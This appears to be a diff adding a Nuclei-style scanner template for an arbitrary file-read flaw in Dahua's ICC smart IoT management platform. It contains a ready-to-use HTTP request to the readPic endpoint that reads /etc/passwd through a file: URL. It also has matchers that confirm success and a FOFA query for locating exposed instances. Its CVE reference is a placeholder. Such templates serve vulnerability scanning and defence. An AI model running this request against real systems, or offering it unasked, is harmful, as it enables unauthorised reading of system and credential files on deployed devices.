@@ -1,0 +1,35 @@
+id: dahua-icc-readpic-file-read
+
+info:
+  name: 大华ICC智能物联综合管理平台readpic接口任意文件读取漏洞
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    大华ICC智能物联综合管理平台存在readpic接口组件文件读取漏洞
+      
+      受影响组件路径：/readpic
+      漏洞类型：任意文件读取
+      
+      攻击者可通过构造恶意请求，利用该接口读取服务器上任意可访问的文件内容，包含但不限于系统配置文件、敏感数据文件等，可能导致系统权限泄露和数据篡改风险。
+      
+      fofa: product="Dahua-ICC"
+      reference: https://example.com/cve-2023-xxxx
+  tags: 大华智能物联综合管理平台ICC
+
+http:
+- raw:
+  - |
+    GET /evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd HTTP/1.1
+    Host: {{Hostname}}
+    Connection: close
+    Accept: */*
+    Accept-Language: en
+    Accept-Encoding: gzip
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'root:x:0:0'
